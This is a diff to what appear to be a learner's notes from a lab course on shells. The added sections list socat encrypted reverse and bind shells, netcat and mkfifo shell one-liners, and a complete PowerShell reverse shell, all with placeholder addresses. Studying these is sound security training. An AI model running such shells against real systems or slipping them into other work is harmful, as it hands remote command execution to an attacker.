@@ -73,3 +73,34 @@ Provides a link between two points
 * Local: socat TCP-L:[local] FILE:\`tty`,raw,echo=0
 * Remote: socat TCP:[local_ip]:[local_port] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 * This shell only works when the target is using Linux
+
+# Task 7 - Socat Encrypted Shells
+You can encrypt your shell with socat
+* Prep work before using an encrypted shell
+    * generate a cert on the attacking machine
+        * openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+    * merge key and cert to pem
+        * cat shell.key shell.crt > shell.pem
+* Reverse Shell encrypted
+    * Local: socat OPENSSL-LISTEN:[local_port],cert=shell.pem,verify=0 -
+        * verify 0 ignores cert validation
+    * Remote: socat OPENSSL:[local_ip]:[local_port],verify=0 EXEC:/bin/bash
+* Bind Shell encrypted
+    * transfer cert to remote
+    * Remote: socat OPENSSL-LISTEN:[remote_port],cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+    * Local: socat OPENSSL:[remote_ip]:[remote_port],verify=0 -
+
+# Task 8 - Common Shell Payloads
+* The nc -e option allows you to execute a program, but -e is not a part of most versions of netcat
+* Bind Shell
+    * nc -nvlp [local_port] -e /bin/bash
+* Reverse Shell
+    * nc [remote_ip] [remote_port] -e /bin/bash
+* Linux alternatives using mkfifo
+    * Bind Shell
+        * mkfifo /tmp/f; nc -nvlp [local_port] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+    * Reverse Shell
+        * mkfifo /tmp/f; nc [remote_ip] [remote_port] < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+* Windows PowerShell
+    * Reverse Shell
+        * powershell -c "$client = New-Object System.Net.Sockets.TCPClient('[remote_ip]',[remote_port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
